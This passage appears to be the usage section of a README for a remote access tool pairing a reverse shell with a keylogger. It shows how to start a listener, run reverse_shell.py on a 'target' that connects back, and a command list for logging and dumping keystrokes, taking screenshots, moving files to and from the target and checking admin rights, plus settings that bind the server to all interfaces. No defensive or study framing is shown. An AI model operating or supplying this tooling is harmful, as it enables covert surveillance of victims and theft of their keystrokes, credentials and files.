keylogger.start()
```

### Server Setup (Listener)

```bash
# Terminal 1: Start the server
python3 server.py

# Output:
# [+] Listening For Incoming Connections on 127.0.0.1:54321...
# [+] Target Connected From: ('192.168.1.100', 45678)
```

### Client Connection (Target)

```bash
# Terminal 2: Connect client to server
python3 reverse_shell.py

# Output:
# [*] Attempting to connect to 127.0.0.1:54321
# [+] Successfully connected to 127.0.0.1:54321
```

### Available Commands

Once connected, use these commands in the server terminal:

```bash
* Shell#~192.168.1.100: help                # Show all available commands
* Shell#~192.168.1.100: keylog_start        # Begin keystroke logging
* Shell#~192.168.1.100: keylog_dump         # Display captured keystrokes
* Shell#~192.168.1.100: screenshot          # Capture screen
* Shell#~192.168.1.100: download file.txt   # Download file from target
* Shell#~192.168.1.100: upload file.txt     # Upload file to target
* Shell#~192.168.1.100: check               # Check admin privileges
* Shell#~192.168.1.100: q                   # Quit session
```

### Configuration Options

Edit `.env` file for custom settings:

```env
# Server Configuration
SERVER_HOST=0.0.0.0          # Bind to all interfaces
SERVER_PORT=54321            # Custom port

# Connection Settings  
MAX_CONNECTIONS=5            # Maximum concurrent connections

# File Settings
SCREENSHOT_PREFIX=screenshot # Screenshot filename prefix
```
